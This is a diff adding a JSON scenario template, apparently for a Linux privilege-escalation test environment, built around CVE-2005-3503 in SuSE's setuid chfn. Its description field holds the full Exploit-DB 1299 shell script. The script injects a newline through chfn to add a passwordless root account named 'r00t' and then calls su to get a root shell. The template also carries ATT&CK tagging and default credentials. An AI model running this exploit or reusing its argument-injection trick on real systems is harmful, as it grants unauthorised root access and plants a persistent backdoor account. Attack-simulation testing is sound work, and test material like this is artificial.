@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_1299",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Linux chfn (SuSE 9.3/10) - Local Privilege Escalation (OSVDB-20525;CVE-2005-3503)\n\nExploit source code (1299.sh):\n```\n#!/bin/sh\n#\n# Exploit for SuSE Linux 9.{1,2,3}/10.0, Desktop 1.0, UnitedLinux 1.0\n# and SuSE Linux Enterprise Server {8,9} 'chfn' local root bug.\n#\n# by Hunger <susechfn@hunger.hu>\n#\n# Advistory:\n# http://lists.suse.com/archive/suse-security-announce/2005-Nov/0002.html\n#\n# hunger@suse:~> id\n# uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)\n# hunger@suse:~> ./susechfn.sh\n# Type your current password to get root... :)\n# Password:\n# sh-2.05b# id\n# uid=0(r00t) gid=0(root) groups=0(root)\n\nif [ X\"$SHELL\" = \"X\" ]; then\n\techo \"No SHELL environment, using /bin/sh for default.\"\n\texport SHELL=/bin/sh\nfi\n\nif [ -u /usr/bin/chfn ]; then\n\t/bin/echo \"Type your current password to get root... :)\"\n\t/usr/bin/chfn -h \"`echo -e ':/:'$SHELL'\\nr00t::0:0:'`\" $USER > /dev/null\n\tif [ -u /bin/su ]; then\n\t\t/bin/su r00t\n\t\t/bin/echo \"You can get root again with 'su r00t'\"\n\telse\n\t\techo \"/bin/su file is not setuid root :(\"\n\tfi\nelse\necho \"/usr/bin/chfn file is not setuid root :(\"\nfi\n\n# milw0rm.com [2005-11-08]\n```",
+  "cve": "OSVDB-20525;CVE-2005-3503",
+  "exploitdb_id": "1299",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_1299",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
